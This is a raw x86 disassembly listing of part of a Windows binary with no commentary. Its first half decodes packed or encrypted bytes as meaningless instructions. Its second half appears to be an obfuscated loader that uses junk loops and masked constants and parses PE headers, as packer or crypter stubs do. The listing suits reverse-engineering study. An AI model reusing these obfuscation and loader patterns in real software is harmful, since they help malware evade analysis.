  40468b:	and    DWORD PTR [edx-0x544a575],esi
  404691:	aad    0xbb
  404693:	(bad)  
  404694:	imul   ebp,esp,0x51b293e6
  40469a:	xchg   BYTE PTR [ecx+eiz*1-0x41],dl
  40469e:	fsubp  st(7),st
  4046a0:	imul   esp,DWORD PTR [edx-0x2cfa89a3],0xc8dfe596
  4046aa:	in     al,dx
  4046ab:	pop    eax
  4046ac:	inc    ebx
  4046ad:	(bad)  
  4046ae:	xor    eax,0x251f4ad
  4046b3:	mov    eax,DWORD PTR [esi+esi*8+0x72783cb4]
  4046ba:	(bad)  
  4046bb:	or     eax,0xbd0d533e
  4046c0:	mov    al,ds:0x5697cf29
  4046c5:	mov    cl,0x3f
  4046c7:	mov    bl,0x98
  4046c9:	(bad)  
  4046ca:	hlt    
  4046cb:	and    ch,BYTE PTR [ebp-0x27]
  4046ce:	test   al,0x98
  4046d0:	loopne 0x4046e5
  4046d2:	js     0x404752
  4046d4:	in     al,dx
  4046d5:	loopne 0x4046bf
  4046d7:	inc    ebx
  4046d8:	jle    0x4046d2
  4046da:	out    dx,al
  4046db:	or     ebp,DWORD PTR [edx-0x72]
  4046de:	mov    esp,0xbb5bc035
  4046e3:	aad    0x1b
  4046e5:	pop    esi
  4046e6:	or     esp,eax
  4046e8:	inc    esi
  4046e9:	mov    al,0x3
  4046eb:	test   al,0xaa
  4046ed:	xchg   edx,eax
  4046ee:	push   cs
  4046ef:	dec    ebx
  4046f0:	sub    ebp,DWORD PTR [ebp-0x73]
  4046f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046f4:	clc    
  4046f5:	push   esp
  4046f6:	das    
  4046f7:	aaa    
  4046f8:	push   ds
  4046f9:	xor    edi,DWORD PTR [eax+0x7f]
  4046fc:	fadd   QWORD PTR [eax+0x51]
  4046ff:	call   FWORD PTR ds:0xde554162
  404705:	sbb    DWORD PTR cs:[esi],esi
  404708:	seta   dh
  40470b:	(bad)  [edx-0x73]
  40470e:	(bad)  
  40470f:	push   eax
  404710:	ret    0xdf3c
  404713:	mov    eax,ds:0xdf2a04b7
  404718:	dec    edi
  404719:	dec    esi
  40471a:	fwait
  40471b:	(bad)  
  40471c:	jno    0x4046bb
  40471e:	test   al,0xda
  404720:	add    DWORD PTR [edi+0x37f4f7cd],eax
  404726:	(bad)  
  404727:	xor    edx,DWORD PTR ss:[edi+0x2b]
  40472b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40472c:	jb     0x40475d
  40472e:	jmp    0x404738
  404730:	imul   esp,DWORD PTR cs:[eax],0x106b9b88
  404737:	jne    0x40477b
  404739:	dec    edx
  40473a:	sbb    eax,0x50bca2f9
  40473f:	out    dx,eax
  404740:	cmovne ecx,DWORD PTR [ebx+edx*2-0x3f]
  404745:	xchg   DWORD PTR [ecx],ebx
  404747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404748:	push   esp
  404749:	mov    ah,0x71
  40474b:	xchg   ebx,eax
  40474c:	pop    ecx
  40474d:	or     ebp,DWORD PTR [ecx-0x7e06396b]
  404753:	adc    edi,DWORD PTR [eax]
  404755:	jp     0x404700
  404757:	adc    al,0xc0
  404759:	mov    cl,0x95
  40475b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40475c:	mov    al,0x49
  40475e:	mov    eax,ds:0xbd9a4276
  404763:	adc    esp,DWORD PTR [ebp-0x3f]
  404766:	cld    
  404767:	xor    DWORD PTR [edx],0xffffffb0
  40476a:	je     0x4047d0
  40476c:	sub    DWORD PTR [ecx-0xf],ebp
  40476f:	jo     0x4046f9
  404771:	sbb    bl,ch
  404773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404774:	dec    esp
  404775:	and    bh,bl
  404777:	inc    ecx
  404778:	dec    eax
  404779:	jg     0x4047c9
  40477b:	push   esp
  40477c:	pop    ss
  40477d:	mov    ds:0xfed9a4cb,eax
  404782:	push   esp
  404783:	add    DWORD PTR [edi+0x7b],ecx
  404786:	cmp    edx,ecx
  404788:	mov    esi,0x7ca9440d
  40478d:	popa   
  40478e:	xchg   esi,eax
  40478f:	fisttp QWORD PTR [edi+0x225dd9eb]
  404795:	inc    esi
  404796:	imul   ebp,DWORD PTR [ecx-0x5f],0xffffff9f
  40479a:	xor    edi,ebx
  40479c:	adc    edi,ebp
  40479e:	out    0x66,al
  4047a0:	(bad)  
  4047a1:	cmc    
  4047a2:	push   edx
  4047a3:	or     DWORD PTR [edx-0x15],0xffffffe1
  4047a7:	mov    eax,0xc69412ba
  4047ac:	stos   DWORD PTR es:[edi],eax
  4047ad:	pop    edi
  4047ae:	shr    BYTE PTR [edi-0x6f],cl
  4047b1:	gs xor al,0x9e
  4047b4:	sbb    DWORD PTR [ebx-0x2d],edi
  4047b7:	cdq    
  4047b8:	fs sbb esi,esp
  4047bb:	mov    ds:0xcf42c4e,eax
  4047c0:	jmp    0x9be9:0xf2d928e8
  4047c7:	or     eax,0x2486501f
  4047cc:	das    
  4047cd:	es aas 
  4047cf:	rcr    BYTE PTR [ecx+edx*8],1
  4047d2:	dec    edi
  4047d3:	pop    edi
  4047d4:	mov    cl,0xb0
  4047d6:	shr    ebx,1
  4047d8:	push   edi
  4047d9:	dec    ecx
  4047da:	cwde   
  4047db:	dec    ebp
  4047dc:	call   0x85df:0xa698656d
  4047e3:	in     al,dx
  4047e4:	xchg   si,ax
  4047e6:	cdq    
  4047e7:	outs   dx,BYTE PTR ds:[esi]
  4047e8:	jecxz  0x404788
  4047ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047eb:	sar    esp,1
  4047ed:	in     al,0x28
  4047ef:	add    DWORD PTR [edx+0x7],ecx
  4047f2:	retf   0x95c6
  4047f5:	ror    DWORD PTR ds:0xa01841e8,cl
  4047fb:	ins    BYTE PTR es:[edi],dx
  4047fc:	xor    DWORD PTR [edx+ebx*2],eax
  4047ff:	in     al,dx
  404800:	mov    cl,0xe3
  404802:	mov    ch,0xb2
  404804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404805:	adc    ebx,edi
  404807:	and    esp,DWORD PTR [edi]
  404809:	xchg   esp,eax
  40480a:	jp     0x404848
  40480c:	push   ebx
  40480d:	test   DWORD PTR [ebp-0x53],0x4c518c80
  404814:	test   BYTE PTR [eax],dl
  404816:	lods   al,BYTE PTR ds:[esi]
  404817:	fmul   DWORD PTR [eax+eiz*8-0x1945fe00]
  40481e:	or     al,0xdc
  404820:	cld    
  404821:	das    
  404822:	xchg   bh,dh
  404824:	adc    DWORD PTR [ecx],esp
  404826:	retf   0xfc7d
  404829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40482a:	push   esi
  40482b:	cmp    BYTE PTR [edi-0xe],bl
  40482e:	hlt    
  40482f:	pop    ds
  404830:	jnp    0x4047e5
  404832:	xchg   esp,eax
  404833:	(bad)  
  404835:	scas   al,BYTE PTR es:[edi]
  404836:	pop    ds
  404837:	in     al,dx
  404838:	dec    DWORD PTR [eax+esi*2-0x77da4446]
  40483f:	stos   DWORD PTR es:[edi],eax
  404840:	mov    dh,0x9b
  404842:	(bad)  
  404843:	pop    ss
  404844:	dec    esp
  404845:	mov    ebp,0xdf225138
  40484a:	jb     0x4048a2
  40484c:	xor    ah,ch
  40484e:	pop    ecx
  40484f:	lods   al,BYTE PTR ds:[esi]
  404850:	aas    
  404851:	xchg   ebp,eax
  404852:	test   eax,0xca28884b
  404857:	pop    ebp
  404858:	test   DWORD PTR [edi+0x3b830d9a],edi
  40485e:	jp     0x4047e8
  404860:	mov    ds:0x5071368e,eax
  404865:	xchg   ebx,eax
  404866:	sub    al,0x46
  404868:	xchg   edi,eax
  404869:	test   BYTE PTR [ebx],bl
  40486b:	bound  ebx,QWORD PTR [ebx]
  40486d:	add    eax,0xfc5105f8
  404872:	mov    ah,0x26
  404874:	add    dh,BYTE PTR [eax-0x7f]
  404877:	sbb    esi,DWORD PTR [eax+0x6cb99bf0]
  40487d:	dec    esi
  40487e:	fwait
  40487f:	mov    al,ds:0x2b748bc
  404884:	push   ss
  404885:	sbb    BYTE PTR [edx-0xa],ah
  404888:	idiv   BYTE PTR [esi-0x619a0c3d]
  40488e:	(bad)  
  40488f:	jo     0x404818
  404891:	ss dec esp
  404893:	adc    BYTE PTR [eax+0x98fd259],dh
  404899:	jle    0x4048dd
  40489b:	xchg   ecx,eax
  40489c:	ins    DWORD PTR es:[edi],dx
  40489d:	jmp    0x4048b5
  40489f:	jmp    0xa8847ef4
  4048a4:	pop    eax
  4048a5:	or     DWORD PTR ds:0x202dd71a,ebx
  4048ab:	add    BYTE PTR [ebx+ebp*4],ch
  4048ae:	sub    DWORD PTR [ebx-0x4e423909],edx
  4048b4:	neg    BYTE PTR [ebp+0x6]
  4048b7:	and    dh,al
  4048b9:	mov    ebx,0xeb9933ec
  4048be:	or     BYTE PTR [di+0x4d],0xbc
  4048c3:	jle    0x404883
  4048c5:	or     DWORD PTR [ebx-0x3c2e2990],esp
  4048cb:	nop
  4048cc:	pop    ecx
  4048cd:	mov    ds:0x12439dca,eax
  4048d2:	inc    ebp
  4048d3:	xchg   eax,edi
  4048d5:	mov    ds:0x39ca3b82,al
  4048da:	call   0xee41:0xea7982ee
  4048e1:	outs   dx,DWORD PTR ss:[esi]
  4048e3:	pop    ebx
  4048e4:	int3   
  4048e5:	dec    esp
  4048e6:	and    eax,0xbb0341fa
  4048eb:	sbb    ecx,ebp
  4048ed:	bound  edi,QWORD PTR [edx+ebp*4]
  4048f0:	jne    0x404899
  4048f2:	mov    ecx,0x5ccf4e47
  4048f7:	mov    eax,ds:0xb1117dc1
  4048fc:	fs loopne 0x404962
  4048ff:	push   edx
  404900:	gs jp  0x404956
  404903:	in     eax,dx
  404904:	stos   DWORD PTR es:[edi],eax
  404905:	pushf  
  404906:	and    edx,ebx
  404908:	dec    edi
  404909:	je     0x4048bd
  40490b:	jp     0x40491b
  40490d:	xchg   ebp,eax
  40490e:	scas   eax,DWORD PTR es:[edi]
  40490f:	int3   
  404910:	popf   
  404911:	inc    esi
  404912:	out    dx,eax
  404913:	daa    
  404914:	inc    esp
  404915:	sbb    BYTE PTR [ebx],al
  404917:	mov    edi,0x5d8d8ccc
  40491c:	(bad)  [edx-0x2e509c3a]
  404922:	fidivr WORD PTR [eax]
  404924:	push   ebx
  404925:	mov    eax,0xfb20956b
  40492a:	pop    ebp
  40492b:	mov    eax,0x6df62821
  404930:	(bad)  
  404931:	dec    esi
  404932:	lahf   
  404933:	xchg   ecx,eax
  404934:	ret    0x97e4
  404937:	pop    es
  404938:	cmp    edi,edi
  40493a:	jne    0x404973
  40493c:	mov    edi,0x6b5a4dd6
  404941:	sub    dh,cl
  404943:	in     al,0xf7
  404945:	push   0xff389189
  40494a:	sar    BYTE PTR [esi+eiz*8],cl
  40494d:	inc    ecx
  40494e:	leave  
  40494f:	in     al,dx
  404950:	or     al,0xbf
  404952:	mov    dl,0xf4
  404954:	mov    al,ds:0xa77b4298
  404959:	sbb    ebp,DWORD PTR [ecx+ebp*1-0x20]
  40495d:	xor    BYTE PTR [edi+esi*2+0x1b],ch
  404961:	mov    cl,0x61
  404963:	push   eax
  404964:	pusha  
  404965:	cmp    DWORD PTR [ecx],ecx
  404967:	scas   eax,DWORD PTR es:[edi]
  404968:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40496a:	mov    bl,0x5f
  40496c:	mov    dh,0xc3
  40496e:	lea    edx,[edx+esi*4]
  404971:	inc    esp
  404972:	cmc    
  404973:	ret    0xdaef
  404976:	pusha  
  404977:	mov    al,0x96
  404979:	inc    edi
  40497a:	pop    eax
  40497b:	or     eax,0x3dafbe80
  404980:	or     ch,BYTE PTR [ecx]
  404982:	test   DWORD PTR [edx],edx
  404984:	imul   ecx,ebp,0x1cbd37ba
  40498a:	pop    ebx
  40498b:	stc    
  40498c:	push   DWORD PTR [ebp-0x5b1d08db]
  404992:	call   0x56be5a47
  404997:	or     esi,0x64f0
  40499d:	mov    edx,0x751089b
  4049a2:	add    DWORD PTR ds:0x435018,0x3361
  4049ac:	xor    ecx,edx
  4049ae:	and    DWORD PTR ds:0x435010,0x0
  4049b8:	xor    esi,esi
  4049ba:	or     esi,DWORD PTR ds:0x435010
  4049c0:	inc    esi
  4049c1:	mov    DWORD PTR ds:0x435010,esi
  4049c7:	cmp    DWORD PTR ds:0x435010,0xb
  4049ce:	jl     0x404a0b
  4049d4:	jmp    0x4049e4
  4049d9:	push   0x1955
  4049de:	call   DWORD PTR ds:0x43a8c4
  4049e4:	cmp    DWORD PTR ds:0x435010,0xa
  4049eb:	jne    0x4049fe
  4049f1:	mov    esi,DWORD PTR ds:0x435010
  4049f7:	inc    esi
  4049f8:	mov    DWORD PTR ds:0x435010,esi
  4049fe:	cmp    DWORD PTR ds:0x435010,0x1c
  404a05:	jb     0x4049b8
  404a0b:	mov    esi,0x3272e2
  404a10:	or     DWORD PTR ds:0x436018,0x436014
  404a1a:	push   edi
  404a1b:	add    edi,DWORD PTR ds:0x43800c
  404a21:	mov    edi,DWORD PTR [ebp+0x10]
  404a24:	add    ecx,esi
  404a26:	mov    DWORD PTR ds:0x43500c,0x38f3
  404a30:	cmp    ecx,edi
  404a32:	mov    DWORD PTR ds:0x43401c,0x3286
  404a3c:	je     0x404b8f
  404a42:	mov    ecx,DWORD PTR [ebp-0x4]
  404a45:	sbb    edi,DWORD PTR ds:0x435014
  404a4b:	mov    edi,DWORD PTR [ebp+0x10]
  404a4e:	xor    eax,eax
  404a50:	xor    DWORD PTR ds:0x435018,0x434028
  404a5a:	xor    ecx,edx
  404a5c:	add    ecx,esi
  404a5e:	mov    DWORD PTR ds:0x434024,0x7740
  404a68:	add    edi,0xfabdbee7
  404a6e:	adc    eax,0xffffffff
  404a71:	inc    DWORD PTR ds:0x437010
  404a77:	xor    eax,0x0
  404a7a:	or     DWORD PTR ds:0x438008,0x434024
  404a84:	mov    DWORD PTR [ebp-0xc],eax
  404a87:	push   ebx
  404a88:	xor    ebx,ebx
  404a8a:	adc    DWORD PTR ds:0x43400c,0x682
  404a94:	xor    edi,0x8a29a12d
  404a9a:	mov    DWORD PTR ds:0x436008,0x12
  404aa4:	cmp    DWORD PTR ds:0x436008,0x0
  404aab:	je     0x404af4
  404ab1:	cmp    DWORD PTR ds:0x436008,0x3
  404ab8:	jle    0x404af4
  404abe:	jmp    0x404acc
  404ac3:	push   DWORD PTR [ebp-0x18]
  404ac6:	call   DWORD PTR ds:0x43a8c8
  404acc:	cmp    DWORD PTR ds:0x436008,0x4
  404ad3:	jne    0x404ae4
  404ad9:	mov    eax,ds:0x436008
  404ade:	dec    eax
  404adf:	mov    ds:0x436008,eax
  404ae4:	mov    eax,ds:0x436008
  404ae9:	dec    eax
  404aea:	mov    ds:0x436008,eax
  404aef:	jmp    0x404aa4
  404af4:	mov    eax,ecx
  404af6:	add    eax,0xfabdbee7
  404afb:	adc    ebx,0xffffffff
  404afe:	xor    eax,0x8a29a12d
  404b03:	xor    ebx,0x0
  404b06:	cmp    eax,edi
  404b08:	jne    0x404b21
  404b0e:	cmp    ebx,DWORD PTR [ebp-0xc]
  404b11:	je     0x404b89
  404b17:	jmp    0x404b21
  404b1c:	mov    esi,0x3272e2
  404b21:	mov    eax,DWORD PTR [ebp-0x4]
  404b24:	mov    edi,DWORD PTR [ebp-0x8]
  404b27:	xor    edi,edx
  404b29:	add    edi,esi
  404b2b:	mov    esi,DWORD PTR [ebp+0x8]
  404b2e:	imul   edi,ecx
  404b31:	mov    ebx,DWORD PTR [ebp+0xc]
  404b34:	xor    eax,edx
  404b36:	add    eax,ecx
  404b38:	mov    al,BYTE PTR [ebx+eax*1+0x3272e2]
  404b3f:	mov    BYTE PTR [edi+esi*1],al
  404b42:	mov    eax,DWORD PTR [ebp-0x8]
  404b45:	mov    esi,DWORD PTR [ebp+0x10]
  404b48:	xor    eax,edx
  404b4a:	xor    ebx,ebx
  404b4c:	add    esi,0xfabdbee7
  404b52:	adc    ebx,0xffffffff
  404b55:	lea    ecx,[ecx+eax*1+0x3272e2]
  404b5c:	xor    edi,edi
  404b5e:	xor    esi,0x8a29a12d
  404b64:	xor    ebx,0x0
  404b67:	mov    eax,ecx
  404b69:	add    eax,0xfabdbee7
  404b6e:	adc    edi,0xffffffff
  404b71:	xor    eax,0x8a29a12d
  404b76:	xor    edi,0x0
  404b79:	cmp    eax,esi
  404b7b:	jne    0x404b1c
  404b81:	cmp    edi,ebx
  404b83:	jne    0x404b1c
  404b89:	mov    eax,0xf89c8584
  404b8e:	pop    ebx
  404b8f:	pop    edi
  404b90:	pop    esi
  404b91:	leave  
  404b92:	ret    0xc
  404b95:	push   ebp
  404b96:	mov    ebp,esp
  404b98:	push   ecx
  404b99:	add    DWORD PTR ds:0x43701c,0x56ef
  404ba3:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404baa:	mov    eax,DWORD PTR [ebp+0x8]
  404bad:	movsx  eax,BYTE PTR [eax]
  404bb0:	and    DWORD PTR ds:0x436004,0x0
  404bba:	mov    ecx,DWORD PTR ds:0x436004
  404bc0:	inc    ecx
  404bc1:	mov    DWORD PTR ds:0x436004,ecx
  404bc7:	cmp    DWORD PTR ds:0x436004,0x6
  404bce:	ja     0x404c0b
  404bd4:	jmp    0x404be4
  404bd9:	push   0x43a0c9
  404bde:	call   DWORD PTR ds:0x43a8d0
  404be4:	cmp    DWORD PTR ds:0x436004,0x5
  404beb:	jne    0x404bfe
  404bf1:	mov    ecx,DWORD PTR ds:0x436004
  404bf7:	inc    ecx
  404bf8:	mov    DWORD PTR ds:0x436004,ecx
  404bfe:	cmp    DWORD PTR ds:0x436004,0x18
  404c05:	jb     0x404bba
  404c0b:	mov    edx,0x3272e2
  404c10:	neg    ecx
  404c12:	sub    eax,edx
  404c14:	mov    ecx,0x751089b
  404c19:	xor    eax,ecx
  404c1b:	mov    DWORD PTR ds:0x43600c,0x18ff
  404c25:	cmp    eax,0xf89c85f0
  404c2a:	jne    0x404c59
  404c30:	mov    eax,DWORD PTR [ebp+0x8]
  404c33:	push   esi
  404c34:	mov    esi,DWORD PTR [ebp+0x8]
  404c37:	add    esi,DWORD PTR [eax+0x3c]
  404c3a:	mov    DWORD PTR [ebp+0x8],esi
  404c3d:	mov    eax,DWORD PTR [ebp-0x4]
  404c40:	mov    esi,DWORD PTR [ebp+0x8]
  404c43:	xor    eax,ecx
  404c45:	add    eax,edx
  404c47:	cmp    DWORD PTR [esi+0x54],eax
  404c4a:	pop    esi
  404c4b:	je     0x404c59
  404c51:	mov    eax,DWORD PTR [ebp+0x8]
  404c54:	jmp    0x404c60
  404c59:	mov    eax,DWORD PTR [ebp-0x4]
  404c5c:	xor    eax,ecx
  404c5e:	add    eax,edx
  404c60:	leave  
  404c61:	ret    0x4
  404c64:	push   ebp
  404c65:	mov    ebp,esp
  404c67:	sub    esp,0x38
  404c6a:	or     DWORD PTR ds:0x43500c,0x434024
  404c74:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404c7b:	mov    eax,ds:0x437004
  404c80:	or     DWORD PTR ds:0x434004,eax
  404c86:	push   ebx
  404c87:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  404c8e:	adc    DWORD PTR ds:0x434020,edi
  404c94:	mov    eax,DWORD PTR [ebp-0x4]
  404c97:	xor    DWORD PTR ds:0x437018,0x773f
  404ca1:	push   esi
  404ca2:	xor    DWORD PTR ds:0x435010,0x4a66
  404cac:	mov    esi,0x751089b
  404cb1:	and    DWORD PTR ds:0x435018,0x354c
  404cbb:	xor    eax,esi
  404cbd:	not    DWORD PTR ds:0x436018
  404cc3:	push   edi
  404cc4:	mov    edi,0x3272e2
  404cc9:	add    eax,edi
  404ccb:	xor    DWORD PTR ds:0x434018,0x434000
  404cd5:	mov    DWORD PTR [ebp-0x1c],eax
  404cd8:	and    DWORD PTR ds:0x438010,0x0
  404ce2:	mov    eax,ds:0x438010
  404ce7:	inc    eax
  404ce8:	mov    ds:0x438010,eax
  404ced:	cmp    DWORD PTR ds:0x438010,0xb
  404cf4:	jb     0x404d2f
  404cfa:	jmp    0x404d0a
  404cff:	push   0x43a097
  404d04:	call   DWORD PTR ds:0x43a8d4
  404d0a:	cmp    DWORD PTR ds:0x438010,0xa
  404d11:	jne    0x404d22
  404d17:	mov    eax,ds:0x438010
  404d1c:	inc    eax
  404d1d:	mov    ds:0x438010,eax
  404d22:	cmp    DWORD PTR ds:0x438010,0x14
  404d29:	jb     0x404ce2
  404d2f:	mov    eax,DWORD PTR [ebp+0x14]
  404d32:	sbb    DWORD PTR ds:0x437008,0x2430
  404d3c:	test   eax,eax
  404d3e:	je     0x404d99
  404d44:	and    DWORD PTR ds:0x438000,edx
  404d4a:	mov    eax,DWORD PTR [ebp+0x14]
  404d4d:	and    DWORD PTR ds:0x435014,0x0
  404d57:	xor    ebx,ebx
  404d59:	add    ebx,DWORD PTR ds:0x435014
  404d5f:	inc    ebx
  404d60:	mov    DWORD PTR ds:0x435014,ebx
  404d66:	cmp    DWORD PTR ds:0x435014,0x29
  404d6d:	jl     0x404d8e
  404d73:	jmp    0x404d81
  404d78:	push   DWORD PTR [ebp-0x24]
  404d7b:	call   DWORD PTR ds:0x43a8dc
  404d81:	cmp    DWORD PTR ds:0x435014,0x1a
  404d88:	jb     0x404d57
  404d8e:	mov    eax,DWORD PTR [eax]
  404d90:	or     ebx,DWORD PTR ds:0x438014
  404d96:	mov    DWORD PTR [ebp-0x1c],eax
  404d99:	or     DWORD PTR ds:0x436008,0x1828
  404da3:	mov    eax,DWORD PTR [ebp-0x4]
  404da6:	adc    DWORD PTR ds:0x437014,edi
  404dac:	xor    eax,esi
  404dae:	xor    ebx,ebx
  404db0:	or     ebx,DWORD PTR ds:0x436018
  404db6:	xor    DWORD PTR ds:0x434004,ebx
  404dbc:	add    eax,edi
  404dbe:	mov    DWORD PTR [ebp-0x8],eax
  404dc1:	add    DWORD PTR ds:0x43601c,0x710e
  404dcb:	mov    eax,DWORD PTR [ebp-0xc]
  404dce:	xor    ebx,ebx
  404dd0:	add    ebx,DWORD PTR ds:0x438008
  404dd6:	and    DWORD PTR ds:0x438018,ebx
  404ddc:	xor    eax,esi
  404dde:	and    DWORD PTR ds:0x438010,0x0
  404de8:	xor    ebx,ebx
  404dea:	add    ebx,DWORD PTR ds:0x438010
  404df0:	inc    ebx
  404df1:	mov    DWORD PTR ds:0x438010,ebx
  404df7:	cmp    DWORD PTR ds:0x438010,0x29
  404dfe:	jg     0x404e2c
  404e04:	jmp    0x404e1f
  404e09:	push   0x43a097
  404e0e:	push   DWORD PTR [ebp-0x24]
  404e11:	push   0x5041
  404e16:	push   DWORD PTR [ebp-0x1c]
  404e19:	call   DWORD PTR ds:0x43a8e0
  404e1f:	cmp    DWORD PTR ds:0x438010,0x1d
  404e26:	jb     0x404de8
  404e2c:	add    eax,edi
  404e2e:	movzx  ebx,WORD PTR ds:0x434018
  404e35:	sbb    ebx,DWORD PTR ds:0x434000
  404e3b:	mov    DWORD PTR ds:0x434018,ebx
  404e41:	mov    DWORD PTR [ebp-0x24],eax
  404e44:	mov    eax,DWORD PTR [ebp-0x4]
  404e47:	and    DWORD PTR ds:0x437004,edx
  404e4d:	xor    eax,esi
  404e4f:	add    eax,edi
  404e51:	add    DWORD PTR ds:0x43600c,0x546e
  404e5b:	mov    DWORD PTR [ebp-0x30],eax
  404e5e:	sub    eax,ebx
  404e60:	mov    ebx,DWORD PTR [ebp-0x4]
  404e63:	sub    DWORD PTR ds:0x435008,0x4ecf
  404e6d:	xor    ebx,esi
  404e6f:	sub    DWORD PTR ds:0x436004,edx
  404e75:	add    ebx,edi
  404e77:	adc    DWORD PTR ds:0x438000,0x4ed2
  404e81:	mov    eax,DWORD PTR [ebp-0x24]
  404e84:	xor    DWORD PTR ds:0x435018,0x43700c
  404e8e:	sub    eax,edi
  404e90:	lea    ecx,[ebx-0x3272e2]
  404e96:	xor    eax,esi
  404e98:	adc    DWORD PTR ds:0x436010,0x436014
  404ea2:	xor    ecx,esi
  404ea4:	mov    DWORD PTR ds:0x438004,0x37e0
  404eae:	cmp    ecx,eax
  404eb0:	mov    DWORD PTR ds:0x437000,0x70b7
  404eba:	je     0x4051ec
  404ec0:	and    DWORD PTR ds:0x43701c,0x0
  404eca:	xor    eax,eax
  404ecc:	or     eax,DWORD PTR ds:0x43701c
  404ed2:	inc    eax
  404ed3:	mov    ds:0x43701c,eax
  404ed8:	cmp    DWORD PTR ds:0x43701c,0x6
  404edf:	ja     0x404f2d
  404ee5:	jmp    0x404f08
  404eea:	push   DWORD PTR [ebp-0xc]
  404eed:	push   0x434024
  404ef2:	push   DWORD PTR [ebp-0x10]
  404ef5:	push   0x43a000
  404efa:	push   0x794f
  404eff:	push   DWORD PTR [ebp-0x28]
  404f02:	call   DWORD PTR ds:0x43a8e4
  404f08:	cmp    DWORD PTR ds:0x43701c,0x5
  404f0f:	jne    0x404f20
  404f15:	mov    eax,ds:0x43701c
  404f1a:	inc    eax
  404f1b:	mov    ds:0x43701c,eax
  404f20:	cmp    DWORD PTR ds:0x43701c,0x10
  404f27:	jb     0x404eca
  404f2d:	mov    eax,DWORD PTR [ebp-0x4]
  404f30:	xor    eax,esi
  404f32:	sub    DWORD PTR ds:0x435000,0x434020
  404f3c:	add    eax,edi
  404f3e:	cmp    ebx,eax
  404f40:	jne    0x4051c9
  404f46:	adc    DWORD PTR ds:0x437008,0x435000
  404f50:	push   DWORD PTR [ebp+0x8]
  404f53:	adc    DWORD PTR ds:0x43600c,0x30f1
  404f5d:	call   0x404b95
  404f62:	mov    ecx,DWORD PTR ds:0x437010
  404f68:	sub    DWORD PTR ds:0x434024,ecx
  404f6e:	mov    DWORD PTR [ebp-0x14],eax
  404f71:	and    DWORD PTR ds:0x437014,0x0
  404f7b:	mov    eax,ds:0x437014
  404f80:	inc    eax
  404f81:	mov    ds:0x437014,eax
  404f86:	cmp    DWORD PTR ds:0x437014,0x5
  404f8d:	jl     0x404fd1
  404f93:	jmp    0x404fac
  404f98:	push   DWORD PTR [ebp-0x1c]
  404f9b:	push   0x89c7
  404fa0:	push   DWORD PTR [ebp-0x20]
  404fa3:	push   DWORD PTR [ebp-0x28]
  404fa6:	call   DWORD PTR ds:0x43a8e8
  404fac:	cmp    DWORD PTR ds:0x437014,0x4
  404fb3:	jne    0x404fc4
  404fb9:	mov    eax,ds:0x437014
  404fbe:	inc    eax
  404fbf:	mov    ds:0x437014,eax
  404fc4:	cmp    DWORD PTR ds:0x437014,0x1b
  404fcb:	jb     0x404f7b
  404fd1:	mov    eax,DWORD PTR [ebp-0x4]
  404fd4:	add    ecx,0x29bc
  404fda:	mov    ecx,DWORD PTR [ebp-0x14]
  404fdd:	or     DWORD PTR ds:0x43401c,0x7fb4
  404fe7:	xor    eax,esi
  404fe9:	add    eax,edi
  404feb:	cmp    ecx,eax
  404fed:	je     0x405257
  404ff3:	push   DWORD PTR [ebp-0x14]
  404ff6:	and    DWORD PTR ds:0x438000,0x39ab
  405000:	push   DWORD PTR [ebp+0x8]
  405003:	xor    DWORD PTR ds:0x437010,0x438000
  40500d:	call   0x40a3b2
  405012:	sbb    DWORD PTR ds:0x438014,0x3483
  40501c:	mov    DWORD PTR [ebp-0x14],eax
  40501f:	or     ecx,0x551e
  405025:	mov    eax,DWORD PTR [ebp-0x4]
  405028:	mov    ecx,DWORD PTR ds:0x434010
  40502e:	or     DWORD PTR ds:0x437014,ecx
  405034:	mov    ecx,DWORD PTR [ebp-0x14]
  405037:	sub    DWORD PTR ds:0x43801c,0xa60
  405041:	xor    eax,esi
  405043:	add    eax,edi
  405045:	mov    DWORD PTR ds:0x435004,0x1802
  40504f:	cmp    ecx,eax
  405051:	je     0x405257
  405057:	mov    DWORD PTR ds:0x43701c,0x15
  405061:	cmp    DWORD PTR ds:0x43701c,0x0
  405068:	je     0x4050b4
  40506e:	cmp    DWORD PTR ds:0x43701c,0xa
  405075:	jb     0x4050b4
  40507b:	jmp    0x405086
  405080:	call   DWORD PTR ds:0x43a8f0
  405086:	cmp    DWORD PTR ds:0x43701c,0xb
  40508d:	jne    0x4050a0
  405093:	mov    ecx,DWORD PTR ds:0x43701c
  405099:	dec    ecx
  40509a:	mov    DWORD PTR ds:0x43701c,ecx
  4050a0:	xor    ecx,ecx
  4050a2:	or     ecx,DWORD PTR ds:0x43701c
  4050a8:	dec    ecx
  4050a9:	mov    DWORD PTR ds:0x43701c,ecx
  4050af:	jmp    0x405061
  4050b4:	mov    eax,DWORD PTR [ebp-0x14]
  4050b7:	sub    DWORD PTR ds:0x436010,edi
  4050bd:	mov    eax,DWORD PTR [eax+0x18]
  4050c0:	adc    DWORD PTR ds:0x436000,ebx
  4050c6:	mov    DWORD PTR [ebp-0x24],eax
  4050c9:	mov    DWORD PTR ds:0x434028,0x1f
  4050d3:	cmp    DWORD PTR ds:0x434028,0x0
  4050da:	je     0x40510b
  4050e0:	cmp    DWORD PTR ds:0x434028,0x27
  4050e7:	jl     0x40510b
  4050ed:	jmp    0x4050fb
  4050f2:	push   DWORD PTR [ebp-0x14]
  4050f5:	call   DWORD PTR ds:0x43a8f4
  4050fb:	mov    eax,ds:0x434028
  405100:	dec    eax
  405101:	mov    ds:0x434028,eax
  405106:	jmp    0x4050d3
  40510b:	mov    eax,DWORD PTR [ebp-0x14]
  40510e:	or     ecx,0x2a6b
  405114:	mov    ecx,DWORD PTR [ebp+0x8]
  405117:	xor    DWORD PTR ds:0x438000,0x69f8
  405121:	add    ecx,DWORD PTR [eax+0x20]
  405124:	sbb    DWORD PTR ds:0x436014,0x3915
  40512e:	mov    DWORD PTR [ebp-0x2c],ecx
